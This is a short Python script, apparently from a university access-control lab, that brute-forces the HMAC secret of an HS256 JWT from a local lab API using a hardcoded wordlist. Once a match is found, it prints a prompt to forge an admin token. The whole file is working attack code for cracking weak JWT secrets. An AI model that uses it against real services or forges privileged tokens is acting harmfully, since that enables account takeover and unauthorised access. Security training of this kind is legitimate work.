#!/usr/bin/env python3
# ============================================================
# LAB BAC #3 - T1: brute-force secret JWT (Tugas Kuliah) — kikikokok
# JWT HS256 dikeluarkan oleh api/auth/token.php (secret statis &
# lemah). Pemverifikasinya mencocokkan HMAC -> pecah dengan wordlist.
# ============================================================
import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64url_dec(s: str) -> bytes:
    s += "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s.encode())


def b64url(s: bytes) -> str:
    return base64.urlsafe_b64encode(s).rstrip(b"=").decode()


def cocok(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    seg = f"{parts[0]}.{parts[1]}"
    sig = hmac.new(secret.encode(), seg.encode(), hashlib.sha256).digest()
    return hmac.compare_digest(sig, b64url_dec(parts[2]))


WORDLIST = [
    "KIKI_TOKEN_2026",
    "rahasia", "secret", "kikikokok", "123456", "password",
    "toko", "mitra", "2026", "jwt", "jwtsecret", "admin123",
    "kiki", "KIKI", "token2024", "rahasia2024", "key",
]

ap = argparse.ArgumentParser(description="crack secret JWT HS256 (lab lokal)")
ap.add_argument("token", help="token asli dari api/auth/token.php")
args = ap.parse_args()

payload_b64 = args.token.split(".")[1]
try:
    payload = json.loads(b64url_dec(payload_b64))
except Exception:
    sys.exit("token tidak valid")

print("Payload:", payload)
for w in WORDLIST:
    if cocok(args.token, w):
        print()
        print(f"[+] SECRET DITEMUKAN: '{w}'")
        print(f"    Sekarang buat token admin palsu pakai secret tsb,")
        print(f"    mis. dengan tools/forge_secret_jwt.py atau python biasa.")
        sys.exit(0)
print("[-] tidak cocok di wordlist (trial kata lain / rahasia beda)")